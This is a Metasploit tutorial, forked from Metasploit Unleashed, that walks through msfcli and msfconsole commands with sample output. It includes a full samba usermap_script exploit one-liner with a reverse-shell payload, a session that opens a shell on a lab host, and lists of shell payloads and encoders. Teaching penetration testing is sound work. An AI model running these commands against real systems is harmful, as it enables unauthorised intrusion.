**************************
Fundamentals
**************************

This is a fork from https://www.offensive-security.com/metasploit-unleashed/

In learning how to use Metasploit you will find there are many different interfaces to use with this hacking tool, each with their own strengths and weaknesses. As such, there is no one perfect interface to use with the Metasploit console, although the MSFConsole is the only supported way to access most Metasploit commands. It is still beneficial, however, to be comfortable with all Metasploit interfaces.

MsfCli
=======

The msfcli provides a powerful command line interface to the framework. This allows you to easily add Metasploit exploits into any scripts you may create.
> Note: As of 2015-06-18 msfcli has been removed. One way to obtain similar functionality through msfconsole is by using the -x option. For example, the following command sets all the options for samba/usermap_script and runs it against a target:

::

  root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
  set RHOST 172.16.194.172;\
  set PAYLOAD cmd/unix/reverse;\
  set LHOST 172.16.194.163;\
  run"


Running the msfcli help command:


::

  root@kali:~# msfcli -h
  Usage: /usr/bin/msfcli  >option=value> [mode]
 ===========================================================

    Mode           Description
    ----           -----------
    (A)dvanced     Show available advanced options for this module
    (AC)tions      Show available actions for this auxiliary module
    (C)heck        Run the check routine of the selected module
    (E)xecute      Execute the selected module
    (H)elp         You're looking at it baby!
    (I)DS Evasion  Show available ids evasion options for this module
    (O)ptions      Show available options for this module
    (P)ayloads     Show available payloads for this module
    (S)ummary      Show information about this module
    (T)argets      Show available targets for this exploit module

 Examples:
 msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=IP E
 msfcli auxiliary/scanner/http/http_version rhosts=IP encoder= post= nop= E


Note: when using msfcli, variables are assigned using the “equal to” operator = and that all options are case-sensitive.


::

  root@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/reverse LHOST=172.16.194.163 E
 [*] Please wait while we load the module tree...

                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
 ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
 ####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
 ## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
 ##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v4.5.0-dev [core:4.5 api:1.0]
 + -- --=[ 936 exploits - 500 auxiliary - 151 post
 + -- --=[ 252 payloads - 28 encoders - 8 nops
       =[ svn r15767 updated today (2012.08.22)

 RHOST => 172.16.194.172
 PAYLOAD => cmd/unix/reverse
 [*] Started reverse double handler
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo cSKqD83oiquo0xMr;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "cSKqD83oiquo0xMr\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:57682) at 2012-06-14 09:58:19 -0400

 uname -a
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

If you aren’t entirely sure about what options belong to a particular module, you can append the letter ‘O‘ to the end of the string at whichever point you are stuck.

::

  root@kali:~# msfcli exploit/multi/samba/usermap_script O
 [*] Initializing modules...

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port


To display available payloads for the current module, append the letter ‘P‘ to the msfcli command line string.

::

  root@kali:~# msfcli exploit/multi/samba/usermap_script P
 [*]Initializing modules...

 Compatible payloads
 ===================

   Name                                Description
   ----                                -----------
   cmd/unix/bind_awk                   Listen for a connection and spawn a command shell via GNU AWK
   cmd/unix/bind_inetd                 Listen for a connection and spawn a command shell (persistent)
   cmd/unix/bind_lua                   Listen for a connection and spawn a command shell via Lua
   cmd/unix/bind_netcat                Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_netcat_gaping         Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_netcat_gaping_ipv6    Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_perl                  Listen for a connection and spawn a command shell via perl
   cmd/unix/bind_perl_ipv6             Listen for a connection and spawn a command shell via perl
   cmd/unix/bind_ruby                  Continually listen for a connection and spawn a command shell via Ruby
   cmd/unix/bind_ruby_ipv6             Continually listen for a connection and spawn a command shell via Ruby
   cmd/unix/bind_zsh
        Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is
        often available, please be aware it isn't usually installed by default.

   cmd/unix/generic                    Executes the supplied command
   cmd/unix/reverse                    Creates an interactive shell through two inbound connections
   cmd/unix/reverse_awk                Creates an interactive shell via GNU AWK
   cmd/unix/reverse_lua                Creates an interactive shell via Lua
   cmd/unix/reverse_netcat             Creates an interactive shell via netcat
   cmd/unix/reverse_netcat_gaping      Creates an interactive shell via netcat
   cmd/unix/reverse_openssl            Creates an interactive shell through two inbound connections
   cmd/unix/reverse_perl               Creates an interactive shell via perl
   cmd/unix/reverse_perl_ssl           Creates an interactive shell via perl, uses SSL
   cmd/unix/reverse_php_ssl            Creates an interactive shell via php, uses SSL
   cmd/unix/reverse_python             Connect back and create a command shell via Python
   cmd/unix/reverse_python_ssl         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
   cmd/unix/reverse_ruby               Connect back and create a command shell via Ruby
   cmd/unix/reverse_ruby_ssl           Connect back and create a command shell via Ruby, uses SSL
   cmd/unix/reverse_ssl_double_telnet  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option
   cmd/unix/reverse_zsh
        Connect back and create a command shell via Zsh.  Note: Although Zsh is often
        available, please be aware it isn't usually installed by default.


Benefits of the MSFcli Interface

* Supports the launching of exploits and auxiliary modules
*  Useful for specific tasks
*  Good for learning
*  Convenient to use when testing or developing a new exploit
*  Good tool for one-off exploitation
*  Excellent if you know exactly which exploit and options you need
*  Wonderful for use in scripts and basic automation

The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn’t support any of the advanced automation features of msfconsole.

msfconsole
==========

::

 back          Move back from the current context
 banner        Display an awesome metasploit banner
 cd            Change the current working directory
 color         Toggle color
 connect       Communicate with a host
 edit          Edit the current module with $VISUAL or $EDITOR
 exit          Exit the console
 get           Gets the value of a context-specific variable
 getg          Gets the value of a global variable
 go_pro        Launch Metasploit web GUI

 grep          Grep the output of another command
 help          Help menu
 info          Displays information about one or more module
 irb           Drop into irb scripting mode
 jobs          Displays and manages jobs
 kill          Kill a job
 load          Load a framework plugin
 loadpath      Searches for and loads modules from a path
 makerc        Save commands entered since start to a file
 popm          Pops the latest module off the stack and makes it active

 previous      Sets the previously loaded module as the current module
 pushm         Pushes the active or list of modules onto the module stack
 quit          Exit the console
 reload_all    Reloads all modules from all defined module paths
 rename_job    Rename a job
 resource      Run the commands stored in a file
 route         Route traffic through a session
 save          Saves the active datastores
 search        Searches module names and descriptions
 sessions      Dump session listings and display information about sessions

 set           Sets a context-specific variable to a value
 setg          Sets a global variable to a value
 show          Displays modules of a given type, or all modules
 sleep         Do nothing for the specified number of seconds
 spool         Write console output into a file as well the screen
 threads       View and manipulate background threads
 unload        Unload a framework plugin
 unset         Unsets one or more context-specific variables
 unsetg        Unsets one or more global variables
 use           Selects a module by name
 version       Show the framework and console library version numbers


back
^^^^

Once you have finished working with a particular module, or if you inadvertently select the wrong module, you can issue the back command to move out of the current context. This, however is not required. Just as you can in commercial routers, you can switch modules from within other modules. As a reminder, variables will only carry over if they are set globally.

::

 msf auxiliary(ms09_001_write) > back
 msf >


banner
^^^^^^

Simply displays a randomly selected banner

::

 msf > banner
  _                                                    _
 /     /         __                         _   __  /_/ __
 | |  / | _____               ___   _____ | | /   _
 | | /| | | ___ |- -|   /    / __ | -__/ | || | || | |- -|
 |_|   | | | _|__  | |_  / - __    | |    | | __/| |  | |_
      |/  |____/  ___/ / \___/   /     __|    |_  ___

 Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
 Metasploit Pro -- type 'go_pro' to launch it now.

       =[ metasploit v4.11.4-2015071402                   ]
 + -- --=[ 1467 exploits - 840 auxiliary - 232 post        ]
 + -- --=[ 432 payloads - 37 encoders - 8 nops             ]


check
^^^^

There aren’t many exploits that support it, but there is also a check option that will check to see if a target is vulnerable to a particular exploit instead of actually exploiting it.

::

 msf exploit(ms08_067_netapi) > show options

 Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    172.16.194.134   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

 Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

 msf exploit(ms08_067_netapi) > check

 [*] Verifying vulnerable status... (path: 0x0000005a)
 [*] System is not vulnerable (status: 0x00000000)
 [*] The target is not exploitable.
 msf  exploit(ms08_067_netapi) >

color
^^^^^^

You can enable or disable if the output you get through the msfconsole will contain colors.

::

 msf > color
 Usage: color >'true'|'false'|'auto'>

 Enable or disable color output.

connect
^^^^^^

There is a miniature Netcat clone built into the msfconsole that supports SSL, proxies, pivoting, and file transfers. By issuing the connect command with an IP address and port number, you can connect to a remote host from within msfconsole the same as you would with Netcat or Telnet.

::

  msf > connect 192.168.1.1 23
 [*] Connected to 192.168.1.1:23
 DD-WRT v24 std (c) 2008 NewMedia-NET GmbH
 Release: 07/27/08 (SVN revision: 10011)
 DD-WRT login:

You can see all the additional options by issuing the “-h” parameter.

::

  msf > connect -h
 Usage: connect [options]

 Communicate with a host, similar to interacting via netcat, taking advantage of
 any configured session pivoting.

 OPTIONS:

    -C        Try to use CRLF for EOL sequence.
    -P <opt>  Specify source port.
    -S <opt>  Specify source address.
    -c <opt>  Specify which Comm to use.
    -h        Help banner.
    -i <opt>  Send the contents of a file.
    -p <opt>  List of proxies to use.
    -s        Connect with SSL.
    -u        Switch to a UDP socket.
    -w <opt>  Specify connect timeout.
    -z        Just try to connect, then return.

 msf >

edit
^^^^

The edit command will edit the current module with $VISUAL or $EDITOR. By default, this will open the current module in Vim.

::

  msf exploit(ms10_061_spoolss) > edit
 [*] Launching /usr/bin/vim /usr/share/metasploit-framework/modules/exploits/windows/smb/ms10_061_spoolss.rb

 ##
 # This module requires Metasploit: http//metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##

 require 'msf/core'
 require 'msf/windows_error'

 class Metasploit3 > Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info = {})

exit
^^^^

The exit command will simply exit msfconsole.

::

 msf exploit(ms10_061_spoolss) > exit
 root@kali:~#


grep
^^^^

The grep command is similar to Linux grep. It matches a given pattern from the output of another msfconsole command. The following is an example of using grep to match output containing the string “http” from a search for modules containing the string “oracle”.

::

  msf > grep
 Usage: grep [options] pattern cmd

 Grep the results of a console command (similar to Linux grep command)

 OPTIONS:

    -A <opt>  Show arg lines of output After a match.
    -B <opt>  Show arg lines of output Before a match.
    -c        Only print a count of matching lines.
    -h        Help banner.
    -i        Ignore case.
    -k <opt>  Keep (include) arg lines at start of output.
    -m <opt>  Stop after arg matches.
    -s <opt>  Skip arg lines of output before attempting match.
    -v        Invert match.
 msf >
 msf > grep http search oracle
   auxiliary/scanner/http/oracle_demantra_database_credentials_leak      2014-02-28       normal     Oracle Demantra Database Credentials Leak
   auxiliary/scanner/http/oracle_demantra_file_retrieval                 2014-02-28       normal     Oracle Demantra Arbitrary File Retrieval with Authentication Bypass
   auxiliary/scanner/http/oracle_ilom_login                                               normal     Oracle ILO Manager Login Brute Force Utility
   exploit/multi/http/glassfish_deployer                                 2011-08-04       excellent  Sun/Oracle GlassFish Server Authenticated Code Execution
   exploit/multi/http/oracle_ats_file_upload                             2016-01-20       excellent  Oracle ATS Arbitrary File Upload
   exploit/multi/http/oracle_reports_rce                                 2014-01-15       great      Oracle Forms and Reports Remote Code Execution
   exploit/windows/http/apache_chunked                                   2002-06-19       good       Apache Win32 Chunked Encoding
   exploit/windows/http/bea_weblogic_post_bof                            2008-07-17       great      Oracle Weblogic Apache Connector POST Request Buffer Overflow
   exploit/windows/http/oracle9i_xdb_pass                                2003-08-18       great      Oracle 9i XDB HTTP PASS Overflow (win32)
   exploit/windows/http/oracle_beehive_evaluation                        2010-06-09       excellent  Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability
   exploit/windows/http/oracle_beehive_prepareaudiotoplay                2015-11-10       excellent  Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload
   exploit/windows/http/oracle_btm_writetofile                           2012-08-07       excellent  Oracle Business Transaction Management FlashTunnelService Remote Code Execution
   exploit/windows/http/oracle_endeca_exec                               2013-07-16       excellent  Oracle Endeca Server Remote Command Execution
   exploit/windows/http/oracle_event_processing_upload                   2014-04-21       excellent  Oracle Event Processing FileUploadServlet Arbitrary File Upload
   exploit/windows/http/osb_uname_jlist                                  2010-07-13       excellent  Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability

help
^^^^

The help command will give you a list and small description of all available commands.

::

  msf > help

 Core Commands
 =============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
 ...snip...

 Database Backend Commands
 =========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
 ...snip...

info
^^^^

The info command will provide detailed information about a particular module including all options, targets, and other information. Be sure to always read the module description prior to using it as some may have un-desired effects.

The info command also provides the following information:

*  The author and licensing information
*  Vulnerability references (ie: CVE, BID, etc)
*  Any payload restrictions the module may have

::

  msf  exploit(ms09_050_smb2_negotiate_func_index) > info exploit/windows/smb/ms09_050_smb2_negotiate_func_index

       Name: Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
     Module: exploit/windows/smb/ms09_050_smb2_negotiate_func_index
    Version: 14774
   Platform: Windows
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Good

 Provided by:
  Laurent Gaffie
  hdm
  sf

 Available targets:
  Id  Name
  --  ----
  0   Windows Vista SP1/SP2 and Server 2008 (x86)

 Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  445              yes       The target port
  WAIT   180              yes       The number of seconds to wait for the attack to complete.

 Payload information:
  Space: 1024

 Description:
  This module exploits an out of bounds function table dereference in
  the SMB request validation code of the SRV2.SYS driver included with
  Windows Vista, Windows 7 release candidates (not RTM), and Windows
  2008 Server prior to R2. Windows Vista without SP1 does not seem
  affected by this flaw.

 References:
  http://www.microsoft.com/technet/security/bulletin/MS09-050.mspx
  http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-3103
  http://www.securityfocus.com/bid/36299
  http://www.osvdb.org/57799
  http://seclists.org/fulldisclosure/2009/Sep/0039.html
  http://www.microsoft.com/technet/security/Bulletin/MS09-050.mspx

 msf  exploit(ms09_050_smb2_negotiate_func_index) >

irb
^^^^

Running the irb command will drop you into a live Ruby interpreter shell where you can issue commands and create Metasploit scripts on the fly. This feature is also very useful for understanding the internals of the Framework.

::

  msf > irb
 [*] Starting IRB shell...

 >> puts "Hello, metasploit!"
 Hello, metasploit!
 => nil
 >> Framework::Version
 => "4.8.2-2014022601"

jobs
^^^^

Jobs are modules that are running in the background. The jobs command provides the ability to list and terminate these jobs.

::

  msf > jobs -h
 Usage: jobs [options]

 Active job manipulation and interaction.

 OPTIONS:

    -K        Terminate all running jobs.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate the specified job name.
    -l        List all running jobs.
    -v        Print more detailed info.  Use with -i and -l

 msf >

kill
^^^^^^^^^^

 The kill command will kill any running jobs when supplied with the job id.

 ::

 msf exploit(ms10_002_aurora) > kill 0
 Stopping job: 0...

 [*] Server stopped.


load
^^^^

The load command loads a plugin from Metasploit’s plugin directory. Arguments are passed as key=val on the shell.

::

  msf > load
 Usage: load  [var=val var=val ...]

 Loads a plugin from the supplied path.  If path is not absolute, first looks
 in the user's plugin directory (/root/.msf4/plugins) then
 in the framework root plugin directory (/usr/share/metasploit-framework/plugins).
 The optional var=val options are custom parameters that can be passed to plugins.

 msf > load pcap_log
 [*] PcapLog plugin loaded.
 [*] Successfully loaded plugin: pcap_log


loadpath
^^^^

The loadpath command will load a third-part module tree for the path so you can point Metasploit at your 0-day exploits, encoders, payloads, etc.

::

  msf > loadpath /home/secret/modules

 Loaded 0 modules.

unload
^^^^

Conversely, the unload command unloads a previously loaded plugin and removes any extended commands.

::

  msf > unload pcap_log
 Unloading plugin pcap_log...unloaded.

resource
^^^^^^

The resource command runs resource (batch) files that can be loaded through msfconsole.

::

  msf > resource
 Usage: resource path1 [path2 ...]

 Run the commands stored in the supplied files.  Resource files may also contain
 ruby code between  tags.

 See also: makerc

Some attacks, such as Karmetasploit, use resource files to run a set of commands in a karma.rc file to create an attack. Later, we will discuss how, outside of Karmetasploit, that can be very useful.

::

  msf > resource karma.rc
 [*] Processing karma.rc for ERB directives.
 resource (karma.rc_.txt)> db_connect postgres:toor@127.0.0.1/msfbook
 resource (karma.rc_.txt)> use auxiliary/server/browser_autopwn
 ...snip...


Batch files can greatly speed up testing and development times as well as allow the user to automate many tasks. Besides loading a batch file from within msfconsole, they can also be passed at startup using the -r flag. The simple example below creates a batch file to display the Metasploit version number at startup.

::

  root@kali:~# echo version > version.rc
 root@kali:~# msfconsole -r version.rc

  _                                                    _
 /     /         __                         _   __  /_/ __
 | |  / | _____               ___   _____ | | /   _
 | | /| | | ___ |- -|   /    / __ | -__/ | || | || | |- -|
 |_|   | | | _|__  | |_  / - __    | |    | | __/| |  | |_
       |/  |____/  ___/ / \___/   /     __|    |_  ___

 Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
 Metasploit Pro -- type 'go_pro' to launch it now.

        =[ metasploit v4.8.2-2014021901 [core:4.8 api:1.0] ]
 + -- --=[ 1265 exploits - 695 auxiliary - 202 post ]
 + -- --=[ 330 payloads - 32 encoders - 8 nops      ]

 [*] Processing version.rc for ERB directives.
 resource (version.rc)> version
 Framework: 4.8.2-2014022601
 Console  : 4.8.2-2014022601.15168
 msf >

route
^^^^

The “route” command in Metasploit allows you to route sockets through a session or ‘comm’, providing basic pivoting capabilities. To add a route, you pass the target subnet and network mask followed by the session (comm) number.

::

 meterpreter > route -h
 Route traffic destined to a given subnet through a supplied session.

 Usage:
  route [add/remove] subnet netmask [comm/sid]
  route [add/remove] cidr [comm/sid]
  route [get]
  route [flush]
  route [print]

 Subcommands:
  add - make a new route
  remove - delete a route; 'del' is an alias
  flush - remove all routes
  get - display the route for a given target
  print - show all active routes

 Examples:
  Add a route for all hosts from 192.168.0.0 to 192.168.0.0 through session 1
    route add 192.168.0.0 255.255.255.0 1
    route add 192.168.0.0/24 1

  Delete the above route
    route remove 192.168.0.0/24 1
    route del 192.168.0.0 255.255.255.0 1

  Display the route that would be used for the given host or network
    route get 192.168.0.11

 meterpreter >



 meterpreter > route

 Network routes
 ==============

     Subnet           Netmask          Gateway
     ------           -------          -------
     0.0.0.0          0.0.0.0          172.16.1.254
     127.0.0.0        255.0.0.0        127.0.0.1
     172.16.1.0       255.255.255.0    172.16.1.100
     172.16.1.100     255.255.255.255  127.0.0.1
     172.16.255.255   255.255.255.255  172.16.1.100
     224.0.0.0        240.0.0.0        172.16.1.100
     255.255.255.255  255.255.255.255  172.16.1.100



search
^^^^

The msfconsole includes an extensive regular-expression based search functionality. If you have a general idea of what you are looking for, you can search for it via search. In the output below, a search is being made for MS Bulletin MS09-011. The search function will locate this string within the module names, descriptions, references, etc.

Note the naming convention for Metasploit modules uses underscores versus hyphens.

::

  msf > search usermap_script

 Matching Modules
 ================

   Name                                Disclosure Date  Rank       Description
   ----                                ---------------  ----       -----------
   exploit/multi/samba/usermap_script  2007-05-14       excellent  Samba "username map script" Command Execution

 msf >


help Search
^^^^^^^^

You can further refine your searches by using the built-in keyword system.


::

  msf > help search
 Usage: search [keywords]

 Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)

 Examples:
  search cve:2009 type:exploit app:client

 msf >


name
^^^^

To search using a descriptive name, use the name keyword.

::

  msf > search name:mysql

 Matching Modules
 ================

   Name                                               Disclosure Date  Rank       Description
   ----                                               ---------------  ----       -----------
   auxiliary/admin/mysql/mysql_enum                                    normal     MySQL Enumeration Module
   auxiliary/admin/mysql/mysql_sql                                     normal     MySQL SQL Generic Query
   auxiliary/analyze/jtr_mysql_fast                                    normal     John the Ripper MySQL Password Cracker (Fast Mode)
   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal     MySQL Authentication Bypass Password Dump
   auxiliary/scanner/mysql/mysql_hashdump                              normal     MYSQL Password Hashdump
   auxiliary/scanner/mysql/mysql_login                                 normal     MySQL Login Utility
   auxiliary/scanner/mysql/mysql_schemadump                            normal     MYSQL Schema Dump
   auxiliary/scanner/mysql/mysql_version                               normal     MySQL Server Version Enumeration
   exploit/linux/mysql/mysql_yassl_getname            2010-01-25       good       MySQL yaSSL CertDecoder::GetName Buffer Overflow
   exploit/linux/mysql/mysql_yassl_hello              2008-01-04       good       MySQL yaSSL SSL Hello Message Buffer Overflow
   exploit/windows/mysql/mysql_payload                2009-01-16       excellent  Oracle MySQL for Microsoft Windows Payload Execution
   exploit/windows/mysql/mysql_yassl_hello            2008-01-04       average    MySQL yaSSL SSL Hello Message Buffer Overflow
 msf >


platform
^^^^^^

You can use platform to narrow down your search to modules that affect a specific platform.

::

  msf > search platform:aix

 Matching Modules
 ================

   Name                                  Disclosure Date  Rank    Description
   ----                                  ---------------  ----    -----------
   payload/aix/ppc/shell_bind_tcp                         normal  AIX Command Shell, Bind TCP Inline
   payload/aix/ppc/shell_find_port                        normal  AIX Command Shell, Find Port Inline
   payload/aix/ppc/shell_interact                         normal  AIX execve shell for inetd
 ...snip...


type
^^^^

Using the type lets you filter by module type such as auxiliary, post, exploit, etc.

::

  msf > search type:post

 Matching Modules
 ================

   Name                                                Disclosure Date  Rank    Description
   ----                                                ---------------  ----    -----------
   post/linux/gather/checkvm                                            normal  Linux Gather Virtual Environment Detection
   post/linux/gather/enum_cron                                          normal  Linux Cron Job Enumeration
   post/linux/gather/enum_linux                                         normal  Linux Gather System Information
 ...snip...


author
^^^^^^

Searching with the author keyword lets you search for modules by your favourite author.


::

  msf > search author:dookie

 Matching Modules
 ================

   Name                                                       Disclosure Date  Rank     Description
   ----                                                       ---------------  ----     -----------
   exploit/osx/http/evocam_webserver                          2010-06-01       average  MacOS X EvoCam HTTP GET Buffer Overflow
   exploit/osx/misc/ufo_ai                                    2009-10-28       average  UFO: Alien Invasion IRC Client Buffer Overflow Exploit
   exploit/windows/browser/amaya_bdo                          2009-01-28       normal   Amaya Browser v11.0 bdo tag overflow
 ...snip...


multiple
^^^^^^

You can also combine multiple keywords together to further narrow down the returned results.


::

  msf > search cve:2011 author:jduck platform:linux

 Matching Modules
 ================

   Name                                         Disclosure Date  Rank     Description
   ----                                         ---------------  ----     -----------
   exploit/linux/misc/netsupport_manager_agent  2011-01-08       average  NetSupport Manager Agent Remote Buffer Overflow


sessions
^^^^^^

The sessions command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNC, etc.


::

  msf > sessions -h
 Usage: sessions [options] or sessions [id]

 Active session manipulation and interaction.

 OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -c <opt>  Run a command on the session given with -i, or all
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -q        Quiet mode
    -r        Reset the ring buffer for the session given with -i, or all
    -s <opt>  Run a script on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List sessions in verbose mode
    -x        Show extended information in the session table

 Many options allow specifying session ranges using commas and dashes.
 For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6


To list any active sessions, pass the -l options to sessions.


::

  msf exploit(3proxy) > sessions -l

 Active sessions
 ===============

  Id  Description    Tunnel
  --  -----------    ------
  1   Command shell  192.168.1.101:33191 -> 192.168.1.104:4444


To interact with a given session, you just need to use the ‘-i’ switch followed by the Id number of the session.

::

 msf exploit(3proxy) > sessions -i 1
 [*] Starting interaction with 1...

 C:WINDOWSsystem32>


set
^^^^

The set command allows you to configure Framework options and parameters for the current module you are working with.


::

  msf auxiliary(ms09_050_smb2_negotiate_func_index) > set RHOST 172.16.194.134
 RHOST => 172.16.194.134
 msf auxiliary(ms09_050_smb2_negotiate_func_index) > show options

 Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  172.16.194.134   yes       The target address
   RPORT  445              yes       The target port
   WAIT   180              yes       The number of seconds to wait for the attack to complete.

 Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


Metasploit also allows you to set an encoder to use at run-time. This is particularly useful in exploit development when you aren’t quite certain as to which payload encoding methods will work with a given exploit.


::

  msf  exploit(ms09_050_smb2_negotiate_func_index) > show encoders

 Compatible Encoders
 ===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


unset
^^^^

The opposite of the set command, of course, is unset. unset removes a parameter previously configured with set. You can remove all assigned variables with unset all.

::

  msf > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf > set THREADS 50
 THREADS => 50
 msf > set

 Global
 ======

  Name     Value
  ----     -----
  RHOSTS   192.168.1.0/24
  THREADS  50

 msf > unset THREADS
 Unsetting THREADS...
 msf > unset all
 Flushing datastore...
 msf > set

 Global
 ======

 No entries in data store.

 msf >


setg
^^^^

In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.


::

  msf > setg LHOST 192.168.1.101
 LHOST => 192.168.1.101
 msf > setg RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf > setg RHOST 192.168.1.136
 RHOST => 192.168.1.136


After setting your different variables, you can run the save command to save your current environment and settings. With your settings saved, they will be automatically loaded on startup, which saves you from having to set everything again.


::

  msf > save
 Saved configuration to: /root/.msf4/config
 msf >


show
^^^^

Entering show at the msfconsole prompt will display every module within Metasploit.

::

  msf > show

 Encoders
 ========

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   cmd/generic_sh                           good       Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                  low        Generic ${IFS} Substitution Command Encoder
   cmd/printf_php_mq                        manual     printf(1) via PHP magic_quotes Utility Command Encoder
 ...snip...

There are a number of show commands you can use but the ones you will use most frequently are show auxiliary, show exploits, show payloads, show encoders, and show nops.


auxiliary
^^^^^^

Executing show auxiliary will display a listing of all of the available auxiliary modules within Metasploit. As mentioned earlier, auxiliary modules include scanners, denial of service modules, fuzzers, and more.

::

  msf > show auxiliary
 Auxiliary
 =========

   Name                                                  Disclosure Date  Rank    Description
   ----                                                  ---------------  ----    -----------
   admin/2wire/xslt_password_reset                       2007-08-15       normal  2Wire Cross-Site Request Forgery Password Reset Vulnerability
   admin/backupexec/dump                                                  normal  Veritas Backup Exec Windows Remote File Access
   admin/backupexec/registry                                              normal  Veritas Backup Exec Server Registry Access
 ...snip...


exploits
^^^^^^

Naturally, show exploits will be the command you are most interested in running since at its core, Metasploit is all about exploitation. Run show exploits to get a listing of all exploits contained in the framework.

::

 msf > show exploits

 Exploits
 ========

   Name                                                           Disclosure Date  Rank       Description
   ----                                                           ---------------  ----       -----------
   aix/rpc_cmsd_opcode21                                          2009-10-07       great      AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow
